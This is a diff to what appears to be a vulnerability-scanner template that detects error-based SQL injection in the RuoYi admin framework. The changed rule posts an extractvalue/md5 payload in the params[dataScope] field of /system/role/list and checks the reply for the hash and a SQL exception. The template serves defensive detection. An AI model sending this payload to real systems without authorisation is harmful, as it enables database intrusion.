@@ -4,13 +4,22 @@ transport: http
 rules:
     r0:
         request:
+            cache: true
+            method: GET
+            path: /system/role
+            follow_redirects: false
+        expression: response.status == 200 && response.body.bcontains(b"ruoyi")
+    r1:
+        request:
+            cache: true
             method: POST
             path: /system/role/list
+            follow_redirects: false
             headers:
                 Content-Type: application/x-www-form-urlencoded
             body: pageSize=&pageNum=&orderByColumn=&isAsc=&roleName=&roleKey=&status=&params[beginTime]=&params[endTime]=&params[dataScope]=and%20extractvalue(1,concat_ws(1,1,md5(2000000005)))
-        expression: response.status == 200 && response.body.bcontains(b"fc9bdfb86bae5c322bae5acd78760935") && response.body.bcontains(b"ruoyi")'
-expression: r0()
+        expression: response.status == 200 && response.body.bcontains(b"fc9bdfb86bae5c322bae5acd78760935") && response.body.bcontains(b"java.sql.SQLException")
+expression: r0() && r1()
 detail:
     author: H00H(https://github.com/H00H)
     links:
